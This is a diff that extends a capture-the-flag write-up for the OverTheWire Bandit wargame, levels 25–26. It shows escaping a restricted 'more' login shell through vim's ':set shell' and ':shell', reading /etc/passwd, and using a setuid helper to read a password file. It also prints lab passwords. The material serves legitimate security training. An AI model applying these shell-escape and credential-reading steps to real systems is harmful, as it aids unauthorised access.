@@ -499,4 +499,40 @@ The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
 # 25
 ```
 ❯ ssh bandit25@bandit.labs.overthewire.org -p 2220
+bandit25@bandit:~$ ls             
+bandit26.sshkey
+bandit25@bandit:~$ cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+bandit25@bandit:~$ cat /usr/bin/showtext
+#!/bin/sh
+
+export TERM=linux
+
+exec more ~/text.txt
+exit 0
+bandit25@bandit:~$ exit
+logout
+Connection to bandit.labs.overthewire.org closed.
+❯ scp -P 2220 bandit25@bandit.labs.overthewire.org:bandit26.sshkey .
+```
+
+# 26
+```
+❯ ssh bandit26@bandit.labs.overthewire.org -p 2220 -i bandit26.sshkey
+  _                     _ _ _   ___   __  
+ | |                   | (_) | |__ \ / /  
+ | |__   __ _ _ __   __| |_| |_   ) / /_  
+ | '_ \ / _` | '_ \ / _` | | __| / / '_ \ 
+ | |_) | (_| | | | | (_| | | |_ / /| (_) |
+ |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
+Connection to bandit.labs.overthewire.org closed.
+```
+I minimized screen to a very small terminal so i can summon vim and enter these command
+```
+:set shell=/bin/bash
+:shell
+bandit26@bandit:~$ ls
+bandit27-do  text.txt
+bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
+YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
 ```
